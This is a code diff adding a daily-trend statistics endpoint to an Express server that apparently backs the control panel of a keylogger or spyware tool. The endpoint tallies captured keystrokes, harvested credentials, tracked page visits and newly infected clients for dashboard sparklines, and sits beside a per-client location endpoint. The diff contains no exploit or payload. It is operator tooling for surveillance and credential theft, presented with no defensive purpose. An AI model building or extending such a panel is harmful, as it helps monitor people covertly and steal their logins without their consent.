@@ -994,6 +994,53 @@ app.get('/api/heatmap', requireAuth, (req, res) => {
     res.json({ hourly, daily, days });
 });
 
+// ── 30-day daily trend for sparklines ────────────────────────
+app.get('/api/stats/trend', requireAuth, (req, res) => {
+    const days = Math.min(parseInt(req.query.days) || 30, 90);
+    const now  = Date.now();
+    const msPerDay = 86400000;
+
+    // Build parallel series: keystrokes, visits, new clients per day
+    const keys    = new Array(days).fill(0);
+    const visits  = new Array(days).fill(0);
+    const clients = new Array(days).fill(0);
+    const creds   = new Array(days).fill(0);
+
+    for (const k of store.keystrokes) {
+        const ts = new Date(k.timestamp).getTime();
+        const idx = Math.floor((now - ts) / msPerDay);
+        if (idx >= 0 && idx < days) keys[idx]++;
+    }
+    for (const v of store.pageVisits) {
+        const ts = new Date(v.timestamp).getTime();
+        const idx = Math.floor((now - ts) / msPerDay);
+        if (idx >= 0 && idx < days) visits[idx]++;
+    }
+    for (const c of (store.credentials || [])) {
+        const ts = new Date(c.timestamp).getTime();
+        const idx = Math.floor((now - ts) / msPerDay);
+        if (idx >= 0 && idx < days) creds[idx]++;
+    }
+    for (const c of Object.values(store.clients)) {
+        const ts = new Date(c.firstSeen).getTime();
+        const idx = Math.floor((now - ts) / msPerDay);
+        if (idx >= 0 && idx < days) clients[idx]++;
+    }
+
+    // Return arrays in chronological order (oldest first = index days-1 → 0)
+    res.json({
+        days,
+        labels: Array.from({length: days}, (_, i) => {
+            const d = new Date(now - (days - 1 - i) * msPerDay);
+            return d.toLocaleDateString('en', { month: 'short', day: 'numeric' });
+        }),
+        keys:    keys.slice().reverse(),
+        visits:  visits.slice().reverse(),
+        clients: clients.slice().reverse(),
+        creds:   creds.slice().reverse()
+    });
+});
+
 app.get('/api/locations', requireAuth, (req, res) => {
     const limit = Math.min(parseInt(req.query.limit) || 100, 2000);
     const cid = req.query.clientId;
